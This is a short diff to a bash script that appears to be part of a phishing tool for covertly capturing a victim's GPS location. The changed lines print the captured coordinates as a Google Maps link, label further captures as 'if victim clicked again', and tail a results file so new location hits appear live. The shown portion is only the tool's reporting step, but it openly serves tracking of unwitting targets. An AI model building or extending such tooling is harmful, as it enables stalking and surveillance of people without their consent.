@@ -87,4 +87,6 @@ while true; do
     fi
 done
 xdg-open "https://maps.google.com/maps?q=${latitude},${longitude}"
-printf "${S7}[${S4}+${S7}] ${S2}Location Link${S1}::${S5} https://maps.google.com/maps?q=${latitude},${longitude}${R0}\n"
+printf "\n\n${S7}[${S4}+${S7}] ${S2}Location ${S1}::${S5} https://maps.google.com/maps?q=${latitude},${longitude}${R0}\n\n\n"
+printf "${S6}Variation if victim clicked again:-${R0}\n\n"
+tail -f $CWD/assets/send/php/result.txt
